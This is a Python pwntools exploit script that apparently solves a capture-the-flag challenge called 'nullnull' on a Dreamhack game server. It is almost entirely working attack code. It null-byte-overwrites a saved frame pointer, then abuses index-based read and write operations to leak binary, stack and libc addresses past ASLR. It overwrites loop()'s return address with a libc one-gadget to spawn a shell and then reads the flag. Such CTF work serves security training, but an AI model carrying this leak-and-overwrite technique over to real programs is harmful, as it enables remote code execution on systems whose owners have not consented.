#!/usr/bin/env python3

from pwn import *

context.aslr = True
context.arch = 'x86_64'
context.log_level = 'info'
warnings.filterwarnings(action='ignore')
context.terminal = ['/home/xion/vscode-terminal']

binary = ELF('../public/nullnull')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
oneshots = [0xe3b31, 0xe3b34]

MASK = (1<<64) - 1

def echo(s):
    p.sendline('1')
    p.sendline(s)
    p.readline()

def writeat(idx, val):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(val))

def readat(idx):
    p.sendline('3')
    p.sendline(str(idx))
    return int(p.readline(False))

DEBUG = False
while True:
    try:
        libc.address = 0
        if DEBUG:
            p = process('../public/nullnull')
            # gdb.attach(p, gdbscript="handle SIGALRM ignore\nhandle SIGHUP ignore\n")
        else:
            p = remote('host2.dreamhack.games', 21224)
        
        # overwrite LOBYTE(rbp) = 0
        echo('A'*80)
        
        # If LOBYTE(rbp) was previously 0x10,
        #  mem = overwritten rbp
        #  len = addr of somewhere inside loop()
        binary.address = readat(3) - 0x1249
        assert binary.address & 0xfff == 0
        log.success(f'binary: 0x{binary.address:012x}')

        # stack addr leakable (but not needed)
        rbp = readat(2) - 0x120
        assert rbp & 0xff == 0
        log.success(f'rbp:    0x{rbp:012x}')

        # leak libc address
        libc.address = readat(0x120 // 8 + 1) - libc.libc_start_main_return
        assert libc.address & 0xfff == 0
        log.success(f'libc  : 0x{libc.address:012x}')

        # set loop() return address to oneshot
        writeat(3, libc.address + oneshots[0])

        # return from loop(), triggering oneshot
        p.sendline('4')

        p.sendline('cat flag')
        print(p.recvregex(r'GoN{.*}'))
        break
    except KeyboardInterrupt:
        break
    except (EOFError, AssertionError):
        pass
    finally:
        try:
            p.close()
        except:
            pass
